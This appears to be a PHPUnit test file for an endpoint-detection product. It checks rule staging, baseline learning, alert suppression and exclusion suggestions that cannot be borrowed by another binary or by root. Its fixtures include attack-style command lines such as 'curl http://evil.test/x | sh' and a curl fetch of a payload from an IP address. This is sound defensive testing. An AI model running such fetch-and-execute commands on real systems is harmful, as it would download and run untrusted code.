<?php

namespace Tests\Unit;

use App\Services\Quality\EdrExclusionSuggester;
use App\Services\Quality\EdrGovernanceStore;
use App\Services\Quality\EdrRuleGovernor;
use Tests\TestCase;

/**
 * Governance decides what a rule match is allowed to do on this host.
 *
 * The first version of these rules produced thirteen alerts on a healthy
 * machine and all thirteen were wrong. That was survivable while the only
 * consequence was a noisy list. Now that a rule can end a process or cut a
 * host off the network, the same mistake ends someone's afternoon — which is
 * why the promotion path to `enforce` is tested as carefully as the
 * suppression logic.
 */
class EdrRuleGovernorTest extends TestCase
{
    private string $path;
    private EdrGovernanceStore $store;

    protected function setUp(): void
    {
        parent::setUp();

        $this->path = sys_get_temp_dir() . '/edr-gov-' . uniqid() . '.sqlite';
        $this->store = new EdrGovernanceStore($this->path);
    }

    protected function tearDown(): void
    {
        $this->store->close();

        foreach (['', '-wal', '-shm'] as $suffix) {
            @unlink($this->path . $suffix);
        }

        parent::tearDown();
    }

    private function governor(): EdrRuleGovernor
    {
        // A fresh governor per assertion: stage decisions are cached for the
        // life of the object, exactly as they are within one sync cycle.
        return new EdrRuleGovernor(new EdrGovernanceStore($this->path));
    }

    private function finding(string $rule, string $severity = 'medium'): array
    {
        return ['rule' => $rule, 'name' => 'test', 'severity' => $severity, 'mitre' => 'T1059', 'reason' => 'test'];
    }

    private function event(array $overrides = []): array
    {
        return array_merge([
            'ts' => time(),
            'action' => 'exec',
            'pid' => 1,
            'ppid' => 0,
            'uid' => 0,
            'username' => 'root',
            'path' => '/usr/bin/curl',
            'cmdline' => 'curl http://198.51.100.9/payload',
            'cwd' => '/tmp',
            'container_id' => '',
        ], $overrides);
    }

    /**
     * A learning window that ignores a live intrusion is worse than useless.
     */
    public function test_learning_holds_back_habits_but_never_attacks(): void
    {
        $governor = $this->governor();
        $governor->ensureBaselineStarted();

        $this->assertTrue($governor->isLearning(7));

        $medium = $governor->assess($this->finding('EDR-004', 'medium'), $this->event(), ['baseline_days' => 7]);
        $this->assertFalse($medium['emit']);
        $this->assertSame('baseline_learning', $medium['reason']);

        foreach (['high', 'critical'] as $severity) {
            $serious = $governor->assess($this->finding('EDR-002', $severity), $this->event(), ['baseline_days' => 7]);
            $this->assertTrue($serious['emit'], "{$severity} must alert during the learning window");
        }
    }

    public function test_learning_can_be_disabled_for_a_known_host(): void
    {
        $governor = $this->governor();
        $governor->ensureBaselineStarted();

        $this->assertFalse($governor->isLearning(0));
        $this->assertTrue($governor->assess($this->finding('EDR-004'), $this->event(), ['baseline_days' => 0])['emit']);
    }

    /**
     * The property that makes response safe: no rule can drive an action
     * until it has been deliberately promoted to enforce.
     */
    public function test_only_an_enforcing_rule_may_drive_a_response(): void
    {
        $options = ['baseline_days' => 0];

        $this->store->setStage('EDR-004', EdrGovernanceStore::STAGE_ALERT);
        $alerting = $this->governor()->assess($this->finding('EDR-004'), $this->event(), $options);
        $this->assertTrue($alerting['emit']);
        $this->assertFalse($alerting['allow_response'], 'alerting is not permission to act');

        $this->store->setStage('EDR-004', EdrGovernanceStore::STAGE_ENFORCE);
        $this->assertTrue($this->governor()->assess($this->finding('EDR-004'), $this->event(), $options)['allow_response']);

        $this->store->setStage('EDR-004', EdrGovernanceStore::STAGE_OBSERVE);
        $observing = $this->governor()->assess($this->finding('EDR-004'), $this->event(), $options);
        $this->assertFalse($observing['emit']);
        $this->assertSame('rule_observing', $observing['reason']);

        $this->store->setStage('EDR-004', EdrGovernanceStore::STAGE_DISABLED);
        $disabled = $this->governor()->assess($this->finding('EDR-004'), $this->event(), $options);
        $this->assertFalse($disabled['emit']);
        $this->assertFalse($disabled['allow_response']);
    }

    public function test_a_hub_stage_overrides_local_state(): void
    {
        $this->store->setStage('EDR-004', EdrGovernanceStore::STAGE_OBSERVE);

        $decision = $this->governor()->assess($this->finding('EDR-004'), $this->event(), [
            'baseline_days' => 0,
            'rule_stages' => ['EDR-004' => EdrGovernanceStore::STAGE_ENFORCE],
        ]);

        $this->assertTrue($decision['allow_response']);
    }

    /**
     * Volatile parts must normalise away, or every run of the same cron job
     * looks new and the baseline learns nothing.
     */
    public function test_signatures_collapse_repetition_but_not_difference(): void
    {
        $governor = $this->governor();

        $first = $governor->signatureFor(
            $this->finding('EDR-004'),
            $this->event(['cmdline' => '/tmp/build-12345/cc -o out a.c', 'pid' => 111])
        );
        $second = $governor->signatureFor(
            $this->finding('EDR-004'),
            $this->event(['cmdline' => '/tmp/build-99887/cc -o out a.c', 'pid' => 222])
        );

        $this->assertSame($first, $second, 'the same activity must produce one signature');

        $different = $governor->signatureFor(
            $this->finding('EDR-004'),
            $this->event(['cmdline' => 'curl http://evil.test/x | sh'])
        );
        $this->assertNotSame($first, $different);

        $otherUser = $governor->signatureFor(
            $this->finding('EDR-004'),
            $this->event(['cmdline' => '/tmp/build-1/cc -o out a.c', 'username' => 'www-data'])
        );
        $this->assertNotSame($first, $otherUser, 'the same command by a different user is not the same event');
    }

    /**
     * A shape that recurred throughout the baseline is this host's normal
     * behaviour — but that reasoning stops at the lower severities.
     */
    public function test_baseline_matches_are_suppressed_except_when_serious(): void
    {
        $event = $this->event(['cmdline' => '/tmp/agentcache/run.sh --daily']);
        $signature = $this->governor()->signatureFor($this->finding('EDR-004'), $event);

        for ($i = 0; $i < 6; $i++) {
            $this->store->observe('EDR-004', $signature, 'sample');
        }

        $options = ['baseline_days' => 0, 'baseline_min_occurrences' => 5];

        $routine = $this->governor()->assess($this->finding('EDR-004', 'medium'), $event, $options);
        $this->assertFalse($routine['emit']);
        $this->assertSame('matches_baseline', $routine['reason']);

        // If a reverse-shell construct ran every day during learning, that is
        // a finding about the baseline, not a reason to stop reporting it.
        $serious = $this->governor()->assess($this->finding('EDR-002', 'critical'), $event, $options);
        $this->assertTrue($serious['emit']);

        $unseen = $this->governor()->assess(
            $this->finding('EDR-004', 'medium'),
            $this->event(['cmdline' => '/tmp/never-seen-before/x']),
            $options
        );
        $this->assertTrue($unseen['emit']);
    }

    /**
     * "Fires a lot" and "wrong a lot" are different problems with opposite
     * fixes, so an unjudged rule must report an unknown rate, not a good one.
     */
    public function test_false_positive_rate_needs_a_verdict_to_exist(): void
    {
        $this->store->recordHit('EDR-099', true);
        $this->store->recordHit('EDR-099', true);
        $this->store->recordHit('EDR-099', false);

        $state = $this->store->findRuleState('EDR-099');
        $this->assertSame(3, (int) $state['hits']);
        $this->assertSame(2, (int) $state['alerts']);
        $this->assertSame(1, (int) $state['suppressed']);
        $this->assertNull($state['fp_rate'], 'no verdicts means unknown, not zero');

        $this->store->recordVerdict('EDR-099', true, 3);
        $this->store->recordVerdict('EDR-099', false, 1);

        $this->assertSame(0.75, $this->store->findRuleState('EDR-099')['fp_rate']);
    }

    public function test_environment_profile_resolves_to_a_known_role(): void
    {
        $this->assertContains(
            $this->governor()->environmentProfile(),
            ['build', 'container_host', 'db', 'web', 'desktop', 'server', 'unknown']
        );
    }

    /**
     * Promotion to enforce is proposed, never automatic — and never on a rule
     * nobody has judged, because silence is not evidence of correctness.
     */
    /**
     * A suggestion has to actually exclude the thing it was generated from.
     *
     * Nothing asserted this before, and the consequence was that every
     * suggestion this class produced was inert. `isExcluded()` matches against
     * path-then-command-line, so `^` anchors to the start of the *path*, while
     * `patternFor()` took its prefix from the command line and anchored it with
     * `^`. Measured on the real haystack `/bin/sh sh -c -- 'stty 2> /dev/null'`
     * the emitted pattern matched nothing, and no test noticed because the
     * suggester and the matcher were only ever tested apart.
     *
     * Completely silent in production too: an operator approves the suggestion,
     * the Hub ships it, `setExclusions()` accepts it because the regex is valid,
     * and the noisy rule keeps firing — which reads as "not applied yet" rather
     * than "cannot ever apply".
     */
    public function test_a_generated_suggestion_actually_excludes_its_own_sample(): void
    {
        $engine = new \App\Services\EdrRuleEngine();
        $suggester = new EdrExclusionSuggester($this->store);

        $event = [
            'path' => '/bin/sh',
            'cmdline' => "sh -c -- 'stty 2> /dev/null'",
            'username' => 'www-data',
        ];

        $governor = new EdrRuleGovernor($this->store);
        $signature = $governor->signatureFor(['rule' => 'EDR-060'], $event);

        for ($i = 0; $i < 30; $i++) {
            $this->store->observe('EDR-060', $signature, $event['cmdline']);
        }

        $suggestions = array_values(array_filter(
            $suggester->suggest(5, 20),
            static fn (array $s): bool => $s['rule'] === 'EDR-060'
        ));

        $this->assertNotEmpty($suggestions, 'a shape seen thirty times should be suggested');

        $engine->setExclusions([$suggestions[0]['pattern']]);
        $this->assertTrue(
            $engine->isExcluded($event),
            'the suggestion must exclude the very event it was derived from'
        );
    }

    /**
     * The anchor is kept rather than dropped, because an unanchored
     * command-line fragment is a bypass: anything that can place the approved
     * text somewhere in its own arguments would be excused by it.
     */
    public function test_a_suggestion_cannot_be_borrowed_by_another_binary(): void
    {
        $engine = new \App\Services\EdrRuleEngine();
        $suggester = new EdrExclusionSuggester($this->store);

        $event = [
            'path' => '/bin/sh',
            'cmdline' => "sh -c -- 'stty 2> /dev/null'",
            'username' => 'www-data',
        ];

        $governor = new EdrRuleGovernor($this->store);

        for ($i = 0; $i < 30; $i++) {
            $this->store->observe('EDR-061', $governor->signatureFor(['rule' => 'EDR-061'], $event), $event['cmdline']);
        }

        $suggestions = array_values(array_filter(
            $suggester->suggest(5, 20),
            static fn (array $s): bool => $s['rule'] === 'EDR-061'
        ));

        $this->assertNotEmpty($suggestions);
        $engine->setExclusions([$suggestions[0]['pattern']]);

        $this->assertFalse($engine->isExcluded([
            'path' => '/tmp/evil',
            'cmdline' => '/tmp/evil --arg="sh -c -- \'stty 2> /dev/null\'"',
            'username' => 'www-data',
        ]), 'another binary must not inherit the approval by quoting it');
    }

    /**
     * Approving a shape for a service account must not excuse root running the
     * same command.
     *
     * This property was previously asserted by a comment and by two branches
     * that returned identical strings, so it did not exist while appearing to —
     * and an attacker able to read the exclusion list would have been handed a
     * pre-approved command line to run as root.
     */
    public function test_an_exclusion_bound_to_an_account_does_not_excuse_root(): void
    {
        $engine = new \App\Services\EdrRuleEngine();
        $suggester = new EdrExclusionSuggester($this->store);

        $event = [
            'path' => '/bin/sh',
            'cmdline' => "sh -c -- 'stty 2> /dev/null'",
            'username' => 'www-data',
        ];

        $governor = new EdrRuleGovernor($this->store);

        for ($i = 0; $i < 30; $i++) {
            $this->store->observe('EDR-062', $governor->signatureFor(['rule' => 'EDR-062'], $event), $event['cmdline']);
        }

        $suggestions = array_values(array_filter(
            $suggester->suggest(5, 20),
            static fn (array $s): bool => $s['rule'] === 'EDR-062'
        ));

        $this->assertNotEmpty($suggestions);
        $this->assertSame('www-data', $suggestions[0]['user'] ?? null, 'a service account must be carried');

        $engine->setExclusions([[
            'pattern' => $suggestions[0]['pattern'],
            'user' => $suggestions[0]['user'],
        ]]);

        $this->assertTrue($engine->isExcluded($event), 'the approved account is excused');

        $this->assertFalse($engine->isExcluded(array_merge($event, ['username' => 'root'])),
            'root running the same command is not');

        // And a plain string exclusion still means "any account", which is what
        // every existing hand-written exclusion is.
        $engine->setExclusions([$suggestions[0]['pattern']]);
        $this->assertTrue($engine->isExcluded(array_merge($event, ['username' => 'root'])));
    }

    public function test_promotion_candidates_require_judged_clean_history(): void
    {
        $suggester = new EdrExclusionSuggester($this->store);

        $this->store->setStage('EDR-050', EdrGovernanceStore::STAGE_ALERT);
        for ($i = 0; $i < 25; $i++) {
            $this->store->recordHit('EDR-050', true);
        }

        $this->assertSame([], $suggester->promotionCandidates(), 'unjudged output must not qualify');

        $this->store->recordVerdict('EDR-050', false, 20);
        $candidates = array_column($suggester->promotionCandidates(), 'rule');
        $this->assertContains('EDR-050', $candidates);

        // A rule analysts keep marking wrong must fall out again.
        $this->store->recordVerdict('EDR-050', true, 20);
        $this->assertNotContains('EDR-050', array_column($suggester->promotionCandidates(), 'rule'));
    }

    /**
     * Excluding a whole binary would hand an attacker the easiest bypass in
     * the product, and the highest-severity rules are never narrowed at all.
     */
    public function test_exclusion_suggestions_stay_narrow_and_skip_critical_rules(): void
    {
        $suggester = new EdrExclusionSuggester($this->store);

        for ($i = 0; $i < 30; $i++) {
            $this->store->observe('EDR-004', 'EDR-004|root|runner|/opt/vendor/runner --daily', 'sample');
            $this->store->observe('EDR-002', 'EDR-002|root|bash|bash -c reverse', 'sample');
            $this->store->observe('EDR-011', 'EDR-011|root|curl|curl', 'sample');
        }

        $suggestions = $suggester->suggest(10, 20);
        $rules = array_column($suggestions, 'rule');

        $this->assertContains('EDR-004', $rules);
        $this->assertNotContains('EDR-002', $rules, 'reverse-shell detection must never be narrowed away');

        // "curl" alone is too short a stem to be a safe exclusion.
        $this->assertNotContains('EDR-011', $rules);
    }
}
